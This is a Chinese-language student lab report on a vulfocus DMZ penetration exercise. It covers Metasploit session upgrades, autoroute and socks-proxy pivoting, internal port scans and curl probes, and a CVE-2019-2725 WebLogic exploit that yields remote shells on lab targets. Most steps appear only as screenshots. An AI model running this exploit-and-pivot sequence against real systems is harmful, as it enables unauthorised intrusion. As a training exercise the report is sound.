# 网络安全实践

## 实验环境
kali2024.4
## 实验内容

## 实验步骤

### 基础运行环境准备

### 漏洞攻防环境搭建

启动vulfocus
![启动vulfocus](./pics/启动vulfocus.png)

### 场景化漏洞攻防（以 vulfocus 提供的【跨网段渗透(常见的dmz)】为例）

1. 场景安装与配置

* 【场景管理】→【环境编排管理】，根据课堂内容创建场景拓扑并保存
![自己布置的场景](./pics/场景具体拓扑图.png)
* 进入【场景】，启动指定场景
![场景](./pics/已上传的场景.png)
启动场景后可以看到相应的
![启动场景](./pics/启动场景后的容器.png)

2. 捕获指定容器的上下行流量，准备抓包
![捕获流量](./pics/捕获指定容器的上下行流量.png)

3. 攻破靶标1

* metasploit 基础配置

```
# 更新 metasploit
sudo apt install -y metasploit-framework
```

![更新](./pics/更新%20metasploit.png)

初始化metasploit本地工作数据库
![初始化metasploit](./pics/初始化metasploit本地工作数据库.png)

![开放端口](./pics/通过%20vulfocus%20场景页面看到入口靶标的开放端口.png)

![工作区](./pics/已经在demo工作区.png)

![工作区](./pics/建立工作区.png)

![搜索](./pics/在metasploit里搜索样例.png)

![use](./pics/使用上述exp.png)

![查看参数](./pics/查看exp可配置参数列表.png)

![靶机IP](./pics/配置靶机IP和目标端口.png)

![主机IP](./pics/配置攻击者主机IP.png)

![payload](./pics/使用合适的exppayload.png)

get shell
![getshell](./pics/getshell.png)
![查看打开的shell](./pics/查看打开的shell.png)

进入会话1并尝试bash指令
![get1](./pics/getshell进入会话1并尝试bash指令.png)
![bash](./pics/已拿到入口flag.png)

4. 建立立足点并发现靶标2-4

* 将cmdshell升级为metrpretershell
```sessions -u 1```
![升级](./pics/将cmdshell升级为metrpretershell.png)
进入会话2
```sessions -i 2```
![进入会话2](./pics/进入会话2.png)

* 进入会话2查看网卡列表

```
ipconfig
arp
route
```

![查看网卡](./pics/进入会话2查看网卡列表.png)

* 查看路由表和arp表

![查看路由表arp表](./pics/查看路由表和arp表.png)
![autoroute](./pics/runautoroute-s.png)

* 搜索可用的portscan
```search portscan```
![搜索](./pics/搜索可用的portscan.png)

use选择的portscan并查看可配置参数列表
![useportscan](./pics/use选择的portscan并查看可配置参数列表.png)
配置portscan参数
![配置参数](./pics/配置portscan参数.png)
tcp扫描100%
![saomiao](./pics/tcp扫描100%25.png)
查看发现新的hosts和services
![查看服务](./pics/扫描100%25后新的设备和hosts.png)
搜索socks_proxy并use
![use](./pics/搜索socks_proxy并use.png)
在后台开启socks—proxy
![socks](./pics/在后台开启socks——proxy.png)

* 新开一个cmd窗口

查看1080端口服务开放情况
![查看服务](./pics/查看1080端口服务开放情况.png)

* 编辑/etc/proxychains4.conf

```
sudo sed -i.bak -r "s/socks4\s+127.0.0.1\s+9050/socks5 127.0.0.1 1080/g" /etc/proxychains4.conf
```
![编辑](./pics/编辑etcproxychains4.png)
在攻击者主机新的窗口nmap扫描
![nmap](./pics/在攻击者主机新的窗口nmap.png)

```
# 重新进入 shell 会话
sessions -i 1
curl http://192.170.84.2:7001 -vv
curl http://192.170.84.3:7001 -vv
curl http://192.170.84.4:7001 -vv
```

![](./pics/curl2.png)
![](./pics/curl3.png)
![](./pics/curl4.png)

5. 攻破靶标2-4

```
# search exploit
search cve-2019-2725

# getshell
use 0
show options
set RHOSTS 192.170.84.2
# 分别设置不同的靶机 IP 
set lhost 192.168.56.214
# 分别 run
run -j
```

![](./pics/拿到flag2.png)
![](./pics/flag3.png)
![](./pics/flg4.png)

6. 攻破最终靶标
![](./pics/升级并发现双网卡.png)
![](./pics/最后一个flag查找中.png)
![](./pics/最后一个flag过程2.png)
![](./pics/flag5.png)

7. 拷贝抓包文件，进行分析
![](./pics/抓包结果之一.png)
![](./pics/抓包结果之二.png)

## 遇到的问题

1. 无法登陆，显示服务器内部错误
![报错](./pics/服务器内部错误.png)

* 解决方法：
![解决方法](./pics/服务器内部错误解决方法.png)
![解决方法](./pics/服务器内部错误解决方法2.png)

2. 无法启动场景，一直有一个容器无法启动，并且无法getflag
![报错](./pics/无法启动场景时查看日志发现报错.png)
![启动场景](./pics/启动场景后的容器.png)
解决方法：发现是docker.io的问题，卸载docker.io安装docker-ce后场景能够顺利运行
![](./pics/查看dockerio.png)
![](./pics/查看dockerce.png)

## 参考资料